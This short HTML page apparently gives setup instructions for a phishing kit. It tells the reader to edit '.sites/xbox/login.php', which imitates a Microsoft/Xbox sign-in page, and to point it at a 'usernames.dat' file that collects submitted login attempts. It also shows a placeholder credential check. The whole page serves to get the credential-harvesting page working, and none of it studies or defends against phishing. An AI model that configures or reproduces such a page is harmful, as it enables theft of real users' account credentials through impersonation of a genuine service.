<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Repository Instructions</title>
</head>
<body>

    <h1>GitHub Repository - Code Modification Instructions</h1>
    
    <p>To enable the functionality of the Microsoft page, follow these steps:</p>
    
    <ol>
        <li>Navigate to the <code>.sites/xbox/login.php</code> directory.</li>
        <li>Within this directory, locate and modify the specified line of code:</li>
    </ol>

    <pre><code>$file_path = '/the rest of your path from root/micro/auth/usernames.dat';</code></pre>

    <p>This adjustment is crucial for accessing the contents of <code>usernames.dat</code>. Update the path accordingly.</p>

    <p>Make changes to the username and password within the file:</p>

    <pre><code>if ($email === "password" &amp;&amp; $pass === "password") {
    // Your code logic here
}</code></pre>

    <p>After making these modifications, execute the page. If no one logs into the page initially, the system will create the document. If nothing is written to the document, it indicates that no login attempts have been made.</p>

</body>
</html>
